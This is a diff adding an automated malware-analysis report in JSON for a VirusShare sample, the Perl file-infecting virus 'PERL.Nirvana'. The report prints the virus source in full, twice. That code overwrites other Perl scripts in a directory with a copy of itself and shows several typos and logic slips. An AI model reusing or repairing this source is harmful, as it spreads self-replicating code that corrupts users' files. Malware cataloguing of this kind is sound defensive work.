@@ -1,0 +1,58 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "open": "May open a file"
+        },
+        "macro": "#!/usr/bin/perl\n# Nirvana RuLeZ the world\n# PERL.Nirvana\n# by Second Part To Hell\n\n# Thanks to SnakeByte for your tutorial!\n\nopen(file,$0);\n@nirvana=<file>;\n@nirvana=@nirvana[0...31]\nclose(file);\n\nforeach $FileName (<*>)\n{\n  if ((-r $FileName) && (-w $FileName) && (-f $FileName))\n  {\n    open (File, \"$FileName\");\n    @Lithium=<File>;\n    close(File);\n    if ((@Lithium[1] =~ \"Nirvana\") or (@Lithium[2] =~ \"Nirvana\"))\n    {\n      if((@Lithium[0] =~ \"perl\",,i) or (@Lithium[1] =~ \"perl\",,i))\n      {\n        open(sliver, \">$FileName\");\n\tprint sliver @Nirvana;\n        print sliver @Litium;\n        close (sliver);\n      }\n    }\n  }\n}"
+    },
+    "filename": "VirusShare_045dec75f0c3ebf243452a2159ee30ed",
+    "filesize": 665,
+    "filetype": "Perl script text executable",
+    "hashes": {
+        "md5": "045dec75f0c3ebf243452a2159ee30ed",
+        "sha1": "318f7851fce78b8212aa59ad2447d30e55c31651",
+        "sha256": "516d34863e7e9eebe8c340d07f182f144c2729aa868bbf72ed20a0b959ca3d40"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/usr/bin/perl",
+            "# Nirvana RuLeZ the world",
+            "# PERL.Nirvana",
+            "# by Second Part To Hell",
+            "# Thanks to SnakeByte for your tutorial!",
+            "open(file,$0);",
+            "@nirvana=<file>;",
+            "@nirvana=@nirvana[0...31]",
+            "close(file);",
+            "foreach $FileName (<*>)",
+            "  if ((-r $FileName) && (-w $FileName) && (-f $FileName))",
+            "    open (File, \"$FileName\");",
+            "    @Lithium=<File>;",
+            "    close(File);",
+            "    if ((@Lithium[1] =~ \"Nirvana\") or (@Lithium[2] =~ \"Nirvana\"))",
+            "    {",
+            "      if((@Lithium[0] =~ \"perl\",,i) or (@Lithium[1] =~ \"perl\",,i))",
+            "      {",
+            "        open(sliver, \">$FileName\");",
+            "\tprint sliver @Nirvana;",
+            "        print sliver @Litium;",
+            "        close (sliver);",
+            "      }",
+            "    }"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.279270",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
